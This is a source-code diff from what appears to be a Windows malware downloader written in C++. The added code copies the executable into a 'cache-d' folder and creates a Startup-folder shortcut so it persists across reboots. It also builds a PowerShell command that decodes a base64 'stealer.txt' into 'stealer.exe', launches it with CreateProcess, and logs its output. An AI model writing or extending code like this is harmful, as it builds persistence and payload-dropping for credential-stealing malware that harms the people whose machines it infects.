@@ -71,7 +71,12 @@ string randomId(size_t length);
 
 
 
-void setPersist() {
+void persist() {
+
+	//Copy itself to its directory
+	string exePath = getExePath();
+	std::filesystem::copy(exePath, data_directory + "\\Downloader.exe");
+
 	//Assuming its copied on its directory folder (cache-d)
 	string source = data_directory + "\\Downloader.exe";
 	string destination = user_directory + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\client.lnk";
@@ -93,7 +98,7 @@ int establishDirectory() {
 		//fs::create_directories(strPath + "\\Downloads\\cache-d");
 		data_directory = strPath + "\\Downloads\\cache-d";
 
-		setPersist();
+		persist();
 
 		return 1;
 	}
@@ -149,19 +154,21 @@ int runScript(char* file_source, char* file_output) {
 ***/
 void createFileFromBase64String(char* filename) {
 
-	/*std::ifstream ifs(filename);
-	std::string content((std::istreambuf_iterator<char>(ifs)), (std::istreambuf_iterator<char>()));*/
 	STARTUPINFO info = {sizeof(info)};
 	PROCESS_INFORMATION processInfo;
-	/*CreateProcess(NULL,
-		"powershell.exe $FileName = Get-Content 'C:\stealer.txt'\n$Destination = 'C:\stealer.exe'\n[IO.File]::WriteAllBytes($Destination, [Convert]::FromBase64String($FileName))",
-	              NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo);*/
-	//TODO Run script
-	/*CreateProcess("C:\Users\alvar\Desktop\B.exe", "> \"C:\Users\alvar\Desktop\tryinghard.txt\"", NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL,
-	              NULL, &info, &processInfo);*/
-	
+	string cmd = "powershell.exe $FileName = Get-Content '" + data_directory +
+	             "\\stealer.txt'\n$Destination = '" + data_directory +
+	             "\\stealer.exe'\n[IO.File]::WriteAllBytes($Destination, "
+	             "[Convert]::FromBase64String($FileName))";
+	LPSTR cmd2 = const_cast<char *>(cmd.c_str());
 
-	runScript("C:\\Users\\alvar\\Desktop\\B.exe", "C:\\Users\\alvar\\Desktop\\tryinghard.txt");
+	//Creates the files by running the powershell command
+	CreateProcess(NULL,cmd2,NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo);
+	
+	//Runs .exe / script
+	string s = data_directory + "\\stealer.exe";
+	string o = data_directory + "\\stealer_log.txt";
+	runScript(&s[0], &o[0]); //To test
 	cout << "TEST COMPLETED***" << endl;
 }
 
